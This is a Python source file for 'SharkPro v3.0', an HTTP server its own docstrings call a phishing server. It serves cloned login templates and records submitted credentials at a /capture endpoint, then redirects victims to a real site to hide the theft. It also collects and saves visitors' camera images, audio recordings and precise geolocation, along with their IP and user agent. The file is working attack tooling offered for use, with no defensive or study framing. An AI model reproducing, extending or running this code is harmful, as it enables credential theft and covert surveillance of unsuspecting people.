#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - Web Server
HTTP server with credential capture and file serving
"""

import os
import json
import base64
import time
from urllib.parse import parse_qs, urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sys
import base64
import binascii

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import *

class SharkHandler(BaseHTTPRequestHandler):
    """Custom HTTP request handler for phishing server"""
    
    # Current template being served
    current_template = {}
    capture_callback = None
    
    def log_message(self, format, *args):
        """Override to suppress default logging"""
        pass
    
    def _set_headers(self, content_type="text/html", status=200):
        """Set response headers"""
        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
    
    def _get_client_info(self):
        """Get client IP and user agent"""
        client_ip = self.client_address[0]
        if 'X-Forwarded-For' in self.headers:
            client_ip = self.headers['X-Forwarded-For'].split(',')[0].strip()
        user_agent = self.headers.get('User-Agent', 'Unknown')
        return client_ip, user_agent
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        
        client_ip, user_agent = self._get_client_info()
        
        # Log visit
        if self.capture_callback:
            self.capture_callback("visit", client_ip, user_agent, path, {})
        
        # Route handling
        if path in ['/', '/index.html']:
            self._serve_file(f"{SERVER_DIR}/index.html", "text/html")
        elif path.endswith('.css'):
            self._serve_file(f"{SERVER_DIR}{path}", "text/css")
        elif path.endswith('.js'):
            self._serve_file(f"{SERVER_DIR}{path}", "application/javascript")
        elif path.startswith('/static/'):
            self._serve_static(path)
        else:
            # Try to serve from server directory
            file_path = f"{SERVER_DIR}{path}"
            if os.path.exists(file_path):
                self._serve_file(file_path)
            else:
                self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests (credential capture)"""
        parsed = urlparse(self.path)
        path = parsed.path
        
        client_ip, user_agent = self._get_client_info()
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            parsed_data = parse_qs(post_data, keep_blank_values=True)
            
            # Flatten parsed data
            data = {k: v[0] if len(v) == 1 else v for k, v in parsed_data.items()}
            
            if path == '/capture':
                # Credentials captured
                if self.capture_callback:
                    self.capture_callback("credentials", client_ip, user_agent, path, data)
                
                # Redirect to real site
                redirect_url = self.current_template.get('redirect', 'https://google.com')
                self.send_response(302)
                self.send_header('Location', redirect_url)
                self.end_headers()
                
            elif path == '/camera':
                # Camera image received
                self._handle_camera_capture(post_data, client_ip)
                
            elif path == '/audio':
                # Audio data received
                self._handle_audio_capture(post_data, client_ip)
                
            elif path == '/location':
                # Location data received
                self._handle_location_data(data, client_ip)
                
            else:
                self.do_GET()
        else:
            self.do_GET()
    
    def _serve_file(self, filepath, content_type=None):
        """Serve a file"""
        try:
            if not content_type:
                if filepath.endswith('.html'):
                    content_type = "text/html"
                elif filepath.endswith('.css'):
                    content_type = "text/css"
                elif filepath.endswith('.js'):
                    content_type = "application/javascript"
                elif filepath.endswith('.png'):
                    content_type = "image/png"
                elif filepath.endswith('.jpg') or filepath.endswith('.jpeg'):
                    content_type = "image/jpeg"
                else:
                    content_type = "application/octet-stream"
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            self._set_headers(content_type)
            self.wfile.write(content)
        except Exception as e:
            print(f"{R}[!] Error serving {filepath}: {e}{NC}")
            self.send_error(404)
    
    def _serve_static(self, path):
        """Serve static files"""
        filepath = os.path.join(STATIC_DIR, path[8:])  # Remove /static/
        if os.path.exists(filepath):
            if filepath.endswith('.css'):
                self._serve_file(filepath, "text/css")
            elif filepath.endswith('.js'):
                self._serve_file(filepath, "application/javascript")
            else:
                self._serve_file(filepath)
        else:
            self.send_error(404)
    
    def _handle_camera_capture(self, data, client_ip):
        """Handle camera image data"""
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_ip = client_ip.replace('.', '_').replace(':', '_')
            filename = f"{CAPTURES_DIR}/cam_{safe_ip}_{timestamp}.jpg"
            
            # Handle base64 data
            if ',' in data:
                data = data.split(',')[1]
            
            image_data = base64.b64decode(data)
            
            with open(filename, 'wb') as f:
                f.write(image_data)
            
            print(f"\n{G}[📷] Camera image saved: {filename}{NC}")
            
            self._set_headers("text/plain")
            self.wfile.write(b"OK")
            
            if self.capture_callback:
                self.capture_callback("camera", client_ip, "", "", {"file": filename})
                
        except Exception as e:
            print(f"{R}[!] Camera error: {e}{NC}")
            self.send_error(500)
    
    def _handle_audio_capture(self, data, client_ip):
        """Handle audio data"""
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_ip = client_ip.replace('.', '_').replace(':', '_')
            filename = f"{CAPTURES_DIR}/audio_{safe_ip}_{timestamp}.webm"
            
            if ',' in data:
                data = data.split(',')[1]
            
            audio_data = base64.b64decode(data)
            
            with open(filename, 'wb') as f:
                f.write(audio_data)
            
            print(f"\n{G}[🎤] Audio saved: {filename}{NC}")
            
            self._set_headers("text/plain")
            self.wfile.write(b"OK")
            
            if self.capture_callback:
                self.capture_callback("audio", client_ip, "", "", {"file": filename})
                
        except Exception as e:
            print(f"{R}[!] Audio error: {e}{NC}")
            self.send_error(500)
    
    def _handle_location_data(self, data, client_ip):
        """Handle location data from browser"""
        try:
            lat = data.get('lat', 'unknown')
            lon = data.get('lon', 'unknown')
            acc = data.get('accuracy', 'unknown')
            
            print(f"\n{G}[📍] Precise location: {lat}, {lon} (±{acc}m){NC}")
            
            if self.capture_callback:
                self.capture_callback("location", client_ip, "", "", {
                    "latitude": lat,
                    "longitude": lon,
                    "accuracy": acc
                })
            
            self._set_headers("text/plain")
            self.wfile.write(b"OK")
            
        except Exception as e:
            print(f"{R}[!] Location error: {e}{NC}")


class SharkServer:
    """Main server class"""
    
    def __init__(self, port=PORT, template=None):
        self.port = port
        self.template = template or {}
        self.server = None
        self.thread = None
        self.running = False
    
    def start(self, capture_callback=None):
        """Start the server"""
        # Set template in handler
        SharkHandler.current_template = self.template
        SharkHandler.capture_callback = capture_callback
        
        try:
            self.server = HTTPServer((SERVER_HOST, self.port), SharkHandler)
            self.server.allow_reuse_address = True
            
            self.thread = threading.Thread(target=self.server.serve_forever)
            self.thread.daemon = True
            self.thread.start()
            
            self.running = True
            print(f"{G}[✓] Server started on {C}http://{SERVER_HOST}:{self.port}{NC}")
            return True
            
        except Exception as e:
            print(f"{R}[!] Server error: {e}{NC}")
            return False
    
    def stop(self):
        """Stop the server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            print(f"{Y}[*] Server stopped{NC}")


if __name__ == "__main__":
    server = SharkServer()
    server.start()
    print("Press Ctrl+C to stop")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
        
